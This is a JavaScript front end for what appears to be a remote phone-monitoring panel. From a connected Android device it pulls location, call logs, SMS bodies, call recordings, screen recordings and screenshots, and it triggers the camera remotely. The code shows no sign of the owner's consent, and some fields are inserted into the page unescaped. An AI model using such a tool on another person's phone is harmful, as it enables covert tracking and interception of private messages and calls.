// Device dashboard page — status, location, camera, mic, info
let deviceKey = "";
(async function() {
    const parts = window.location.pathname.split("/");
    deviceKey = decodeURIComponent(parts[parts.length - 1]);
    document.getElementById("deviceTitle").textContent = "DEVICE: " + deviceKey;
    await loadStatus();
    loadCameras();
    loadMedia();
    loadNickname();
    loadCallLogs();
    loadSms();
})();

function getHostPort() {
    const [host, port] = deviceKey.split(":");
    return { host, port: parseInt(port) || 8443 };
}

async function api(path, options = {}) {
    const res = await fetch(path, {
        headers: { "Content-Type": "application/json" },
        ...options,
    });
    if (res.status === 401) {
        window.location.href = "/";
        return null;
    }
    return res.json();
}

// Status
async function loadStatus() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/health`);
    if (!data) return;
    const online = data.status === "ok";
    const val = document.getElementById("statusOnlineValue");
    const icon = document.getElementById("statusOnlineIcon");
    if (val) {
        val.textContent = online ? "ONLINE" : "OFFLINE";
        // Offline devices render in black (per spec) — on a light chip so
        // the black stays visible against the dark card.
        val.className = "font-headline text-2xl font-bold value " +
            (online ? "text-maquis-green" : "text-black bg-white/90 px-3 py-1 rounded");
    }
    if (icon) {
        icon.className = "material-symbols-outlined " +
            (online ? "text-maquis-green animate-pulse" : "text-black bg-white/90 rounded-full p-1");
    }
    setVal("#statusUptime .value",
        data.uptimeSeconds ? fmtUptime(data.uptimeSeconds) : "—");
    setVal("#statusNetwork .value", `${host}:${port}`);
    if (data.deviceName) {
        document.getElementById("deviceTitle").textContent = "DEVICE: " + data.deviceName;
    }
}

function setVal(sel, text) {
    const el = document.querySelector(sel);
    if (el) el.textContent = text;
}

function fmtUptime(s) {
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
    return `${h}h ${m}m ${sec}s`;
}

// Device Info
async function loadDeviceInfo() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/info`);
    if (!data) return;
    const box = document.getElementById("deviceInfoData");
    const fields = [
        ["Model", data.model], ["Manufacturer", data.manufacturer],
        ["Android", data.androidVersion], ["Build", data.buildId],
        ["Device", data.deviceId], ["Screen", data.screen],
        ["IP", `${host}:${port}`],
    ];
    box.innerHTML = fields
        .filter(([, v]) => v)
        .map(([k, v]) => `<div class="data-row"><span>${k}</span><span>${v}</span></div>`)
        .join("");
}

// Location
let lastFix = null;
async function getLocation() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/location`);
    if (!data) return;
    const box = document.getElementById("locationData");
    const coords = document.getElementById("locationCoords");
    const map = document.getElementById("locationMap");
    const radar = document.getElementById("locationRadar");
    if (data.latitude && data.longitude) {
        const lat = data.latitude, lng = data.longitude;
        lastFix = { lat, lng };
        coords.innerHTML =
            `<span>LAT: ${lat.toFixed(4)}</span><span class="text-moon-silver/30">|</span><span>LON: ${lng.toFixed(4)}</span>` +
            (data.accuracy ? `<span class="text-moon-silver/40">±${Math.round(data.accuracy)}m</span>` : "");
        box.textContent = `FIX_ACQUIRED: ${new Date(data.timestamp || Date.now()).toLocaleTimeString()}`;
        if (map) {
            map.src = `https://maps.google.com/maps?q=${lat},${lng}&z=16&output=embed`;
            map.style.display = "block";
        }
        if (radar) radar.style.display = "none";
    } else {
        box.textContent = data.error === "no_location" ? "NO_GPS_FIX" : JSON.stringify(data);
    }
}

function openMaps() {
    if (!lastFix) { getLocation(); return; }
    window.open(`https://maps.google.com/maps?q=${lastFix.lat},${lastFix.lng}&z=16`, "_blank");
}

// Camera
async function loadCameras() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/cameras`);
    if (!data) return;
    const list = document.getElementById("cameraList");
    const cameras = data.cameras || [];
    if (!cameras.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">videocam_off</span>
            <span class="font-label text-sm text-on-surface/60">NO_SENSORS</span></div>`;
        return;
    }
    list.innerHTML = cameras.map((c, i) => `
        <label class="flex items-center gap-3 p-3 border border-moon-silver/20 rounded cursor-pointer hover:bg-surface-container transition-colors">
            <input type="radio" name="camera_sensor" value="${c.id ?? i}" class="text-hunt-crimson bg-void-black border-moon-silver/30 focus:ring-hunt-crimson focus:ring-offset-void-black">
            <span class="font-label text-sm text-on-surface">${c.name || ("CAM_" + (c.id ?? i))}</span>
        </label>`).join("");
}

async function capturePhoto() {
    const { host, port } = getHostPort();
    const sel = document.querySelector('input[name="camera_sensor"]:checked');
    const cameraId = sel ? sel.value : "0";
    const data = await api(`/api/device/${host}/${port}/camera/capture?camera_id=${cameraId}`,
        { method: "POST", body: JSON.stringify({}) });
    if (!data) return;
    const box = document.getElementById("cameraData");
    box.classList.remove("hidden");
    box.innerHTML = `<div class="font-label text-xs text-maquis-green tracking-widest uppercase">CAPTURE_${data.status === "ok" ? "OK" : "FAILED"}</div>`;
}

// Capture AND pull the file into the local store + media catalogue.
async function capturePhotoPull() {
    const { host, port } = getHostPort();
    const sel = document.querySelector('input[name="camera_sensor"]:checked');
    const cameraId = sel ? sel.value : "back";
    const btn = document.getElementById("captureBtn");
    const original = btn.innerHTML;
    btn.innerHTML = '<span class="material-symbols-outlined text-lg animate-spin">progress_activity</span> CAPTURING';
    btn.disabled = true;
    try {
        const data = await api(`/api/device/${host}/${port}/camera/capture/pull?camera_id=${cameraId}`,
            { method: "POST", body: JSON.stringify({}) });
        const box = document.getElementById("cameraData");
        box.classList.remove("hidden");
        box.innerHTML = data && data.ok
            ? `<div class="font-label text-xs text-maquis-green tracking-widest uppercase">CAPTURE_STORED</div>`
            : `<div class="font-label text-xs text-hunt-crimson tracking-widest uppercase">CAPTURE_FAILED</div>`;
        if (data && data.ok) loadMedia();
    } finally {
        btn.innerHTML = original;
        btn.disabled = false;
    }
}

// Video recording (CameraX on phone, duration-limited, auto-pulled)
async function recordVideo(durationMs) {
    const { host, port } = getHostPort();
    const btn = document.getElementById("videoBtn");
    if (btn) { btn.innerHTML = '<span class="material-symbols-outlined text-lg animate-spin">progress_activity</span> RECORDING'; btn.disabled = true; }
    try {
        const data = await api(`/api/device/${host}/${port}/video/record?camera_id=back&duration_ms=${durationMs}`,
            { method: "POST", body: JSON.stringify({}) });
        const box = document.getElementById("cameraData");
        box.classList.remove("hidden");
        box.innerHTML = data && data.ok
            ? `<div class="font-label text-xs text-maquis-green tracking-widest uppercase">VIDEO_STORED ${fmtDur((data.video?.durationMs || 0) / 1000)}</div>`
            : `<div class="font-label text-xs text-hunt-crimson tracking-widest uppercase">VIDEO_FAILED</div>`;
        if (data && data.ok) loadMedia();
    } finally {
        if (btn) { btn.innerHTML = '<span class="material-symbols-outlined text-lg">videocam</span> REC 5S'; btn.disabled = false; }
    }
}

// ---------------------------------------------------------------------------
// Call logs + SMS (v2.0.0 — phone-side providers, TLS-authenticated)
// ---------------------------------------------------------------------------

async function loadCallLogs() {
    const { host, port } = getHostPort();
    const list = document.getElementById("callLogsList");
    const data = await api(`/api/device/${host}/${port}/logs/calls?limit=50`);
    if (!data) return;
    const calls = data.calls || [];
    if (!calls.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">call</span>
            <span class="font-label text-sm text-on-surface/60">NO_CALLS</span></div>`;
        return;
    }
    list.innerHTML = calls.map(c => `
        <div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded">
            <span class="material-symbols-outlined text-sm ${callTypeColor(c.type)}">${callTypeIcon(c.type)}</span>
            <div class="flex-1 min-w-0">
                <div class="font-label text-sm text-on-surface truncate">${esc(c.number || "unknown")}${c.cachedName ? " · " + esc(c.cachedName) : ""}${c.count > 1 ? ` <span class="text-hunt-crimson font-bold">(${c.count})</span>` : ""}</div>
                <div class="font-label text-[10px] text-moon-silver/50">${esc(String(c.type || "unknown").toUpperCase())} · ${fmtDur(c.durationSec)}${c.count > 1 ? " TOTAL" : ""} · ${new Date(c.date).toLocaleString()}</div>
            </div>
        </div>`).join("");
}

function callTypeColor(t) { return { incoming: "text-maquis-green", outgoing: "text-pyrenees-frost", missed: "text-hunt-crimson" }[t] || "text-moon-silver/60"; }
function callTypeIcon(t) { return { incoming: "call_received", outgoing: "call_made", missed: "missed_video_call" }[t] || "call"; }

async function loadSms() {
    const { host, port } = getHostPort();
    const box = document.getElementById("smsBox").value || "inbox";
    const include = document.getElementById("smsIncludeBody").checked ? 1 : 0;
    const list = document.getElementById("smsList");
    const data = await api(`/api/device/${host}/${port}/sms?box=${box}&limit=50&include_body=${include}`);
    if (!data) return;
    const msgs = data.messages || [];
    if (!msgs.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">sms</span>
            <span class="font-label text-sm text-on-surface/60">NO_MESSAGES</span></div>`;
        return;
    }
    list.innerHTML = msgs.map(m => `
        <div class="flex items-start gap-3 p-3 border border-moon-silver/10 rounded">
            <span class="material-symbols-outlined text-sm text-pyrenees-frost">${box === "sent" ? "send" : "sms"}</span>
            <div class="flex-1 min-w-0">
                <div class="font-label text-sm text-on-surface truncate">${esc(m.address || "unknown")}</div>
                ${m.body ? `<div class="font-label text-[11px] text-moon-silver/80 mt-0.5">${esc(m.body)}</div>` : ""}
                <div class="font-label text-[10px] text-moon-silver/50 mt-0.5">${new Date(m.date).toLocaleString()}${m.read ? "" : " · UNREAD"}</div>
            </div>
        </div>`).join("");
}

function esc(s) {
    return String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}

// Mic toggle
let micRecording = false;
async function toggleMic() {
    micRecording = !micRecording;
    const btn = document.getElementById("micBtn");
    const box = document.getElementById("micData");
    btn.innerHTML = micRecording
        ? `<span class="material-symbols-outlined text-sm">stop</span> STOP`
        : `<span class="material-symbols-outlined text-sm">fiber_manual_record</span> START`;
    btn.classList.toggle("border-hunt-crimson", micRecording);
    btn.classList.toggle("text-hunt-crimson", micRecording);
    box.textContent = micRecording ? "● RECORDING — 00:00" : "STANDBY";
    if (micRecording) {
        window._micTimer = setInterval(() => {
            const el = document.getElementById("micData");
            const m = Math.floor((Date.now() - window._micStart) / 60000);
            const s = Math.floor((Date.now() - window._micStart) / 1000) % 60;
            el.textContent = `● RECORDING — ${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;
        }, 1000);
        window._micStart = Date.now();
    } else {
        clearInterval(window._micTimer);
        box.textContent = `STOPPED — ${Math.floor((Date.now() - window._micStart) / 1000)}s`;
    }
}

// Refresh all
async function refreshDevice() {
    await loadStatus();
    await loadDeviceInfo();
    await loadMedia();
    loadCallLogs();
    loadSms();
}

// ---------------------------------------------------------------------------
// Captured media (call recordings, videos, screen recordings, screenshots)
// + device nickname — all served from the local encrypted DB, phone offline OK
// ---------------------------------------------------------------------------

const MEDIA_META = {
    call_recording:  { icon: "call",              label: "CALL RECORDING" },
    video:           { icon: "movie",             label: "VIDEO" },
    screen_recording:{ icon: "smart_display",     label: "SCREEN RECORDING" },
    screenshot:      { icon: "screenshot_monitor",label: "SCREENSHOT" },
    photo:           { icon: "photo_camera",      label: "PHOTO" },
};

function fmtSize(b) {
    if (!b) return "";
    if (b < 1024) return `${b} B`;
    if (b < 1048576) return `${(b / 1024).toFixed(1)} KB`;
    return `${(b / 1048576).toFixed(1)} MB`;
}

function fmtDur(s) {
    if (!s) return "";
    const m = Math.floor(s / 60), sec = Math.floor(s % 60);
    return `${m}m ${sec.toString().padStart(2, "0")}s`;
}

async function loadMedia() {
    const { host, port } = getHostPort();
    const list = document.getElementById("mediaList");
    const data = await api(`/api/device/${host}/${port}/media`);
    if (!data) return;
    const items = data.media || [];
    if (!items.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">collections</span>
            <span class="font-label text-sm text-on-surface/60">NO_CAPTURES</span></div>`;
        return;
    }
    list.innerHTML = items.map(m => {
        const meta = MEDIA_META[m.kind] || { icon: "folder", label: m.kind };
        const metaLine = [fmtSize(m.size_bytes), fmtDur(m.duration_sec)].filter(Boolean).join(" · ");
        const dl = m.download_url
            ? `<a href="${m.download_url}" target="_blank" title="Download file" class="text-pyrenees-frost/70 hover:text-pyrenees-frost transition-colors p-1">
                 <span class="material-symbols-outlined text-sm">download</span></a>`
            : "";
        return `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded">
            <span class="material-symbols-outlined text-sm text-pyrenees-frost">${meta.icon}</span>
            <div class="flex-1 min-w-0">
                <div class="font-label text-sm text-on-surface truncate">${meta.label}</div>
                <div class="font-label text-[10px] text-moon-silver/50 truncate">${m.path || "—"}${metaLine ? " · " + metaLine : ""} · ${new Date((m.captured_at || Date.now()) * 1000).toLocaleString()}</div>
            </div>
            ${dl}
            <button onclick="deleteMedia(${m.id})" title="Delete entry" class="text-moon-silver/40 hover:text-error transition-colors p-1">
                <span class="material-symbols-outlined text-sm">delete</span>
            </button>
        </div>`;
    }).join("");
}

async function deleteMedia(id) {
    const { host, port } = getHostPort();
    if (!confirm("Delete this media entry from the catalogue?")) return;
    await api(`/api/device/${host}/${port}/media/${id}`, { method: "DELETE" });
    loadMedia();
}

async function saveNickname() {
    const { host, port } = getHostPort();
    const input = document.getElementById("nicknameInput");
    const nick = input.value.trim();
    if (!nick) return;
    await api(`/api/device/${host}/${port}/nickname`,
        { method: "POST", body: JSON.stringify({ nickname: nick }) });
    document.getElementById("deviceTitle").textContent = "DEVICE: " + nick;
    input.blur();
}

async function loadNickname() {
    const { host, port } = getHostPort();
    const devs = await api("/api/devices");
    if (!devs) return;
    const dev = devs[`${host}:${port}`];
    if (dev && dev.nickname) {
        document.getElementById("nicknameInput").value = dev.nickname;
    }
}
